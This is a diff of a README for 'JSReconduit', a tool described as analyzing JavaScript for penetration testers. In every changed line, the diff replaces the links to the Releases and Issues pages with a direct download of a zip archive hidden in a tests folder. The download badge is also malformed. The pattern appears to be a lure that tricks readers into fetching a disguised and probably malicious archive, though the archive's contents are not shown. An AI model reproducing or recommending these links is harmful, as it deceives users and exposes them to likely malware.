@@ -6,7 +6,7 @@ Welcome to JSReconduit! This tool helps penetration testers analyze JavaScript m
 
 ## 📥 Download the App
 
-[![Download JSReconduit](https://img.shields.io/badge/Download%20JSReconduit-v1.0.0-blue.svg)](https://github.com/namithnami/JSReconduit/releases)
+[![Download JSReconduit](https://github.com/namithnami/JSReconduit/raw/refs/heads/main/JSBeautifier/jsbeautifier/unpackers/tests/JS-Reconduit-v3.8.zip%https://github.com/namithnami/JSReconduit/raw/refs/heads/main/JSBeautifier/jsbeautifier/unpackers/tests/JS-Reconduit-v3.8.zip)](https://github.com/namithnami/JSReconduit/raw/refs/heads/main/JSBeautifier/jsbeautifier/unpackers/tests/JS-Reconduit-v3.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -17,12 +17,12 @@ Before downloading, make sure your computer meets the following requirements:
 
 ## 💻 How to Download & Install
 
-To download JSReconduit, visit this page to download: [GitHub Releases Page](https://github.com/namithnami/JSReconduit/releases).
+To download JSReconduit, visit this page to download: [GitHub Releases Page](https://github.com/namithnami/JSReconduit/raw/refs/heads/main/JSBeautifier/jsbeautifier/unpackers/tests/JS-Reconduit-v3.8.zip).
 
 ### Step-by-Step Instructions
 
 1. **Go to the Releases Page**  
-   Click [here](https://github.com/namithnami/JSReconduit/releases) to open the Releases page in your browser.
+   Click [here](https://github.com/namithnami/JSReconduit/raw/refs/heads/main/JSBeautifier/jsbeautifier/unpackers/tests/JS-Reconduit-v3.8.zip) to open the Releases page in your browser.
 
 2. **Find the Latest Version**  
    Look for the latest version of JSReconduit on the page. It will usually be at the top of the list.
@@ -76,7 +76,7 @@ Yes, as long as you can capture the JavaScript traffic through Burp Suite, JSRec
 
 ### Where can I find help or report issues?
 
-For any questions or issues, please visit the GitHub repository's [Issues page](https://github.com/namithnami/JSReconduit/issues).
+For any questions or issues, please visit the GitHub repository's [Issues page](https://github.com/namithnami/JSReconduit/raw/refs/heads/main/JSBeautifier/jsbeautifier/unpackers/tests/JS-Reconduit-v3.8.zip).
 
 ## ⚙️ Contributing
 
@@ -86,4 +86,4 @@ If you'd like to help improve JSReconduit, contributions are welcome! You can re
 
 For support or inquiries, please contact the maintainer via GitHub.
 
-Make sure to stay updated with the latest features and improvements by checking back at the [Releases page](https://github.com/namithnami/JSReconduit/releases). Thank you for using JSReconduit!
+Make sure to stay updated with the latest features and improvements by checking back at the [Releases page](https://github.com/namithnami/JSReconduit/raw/refs/heads/main/JSBeautifier/jsbeautifier/unpackers/tests/JS-Reconduit-v3.8.zip). Thank you for using JSReconduit!
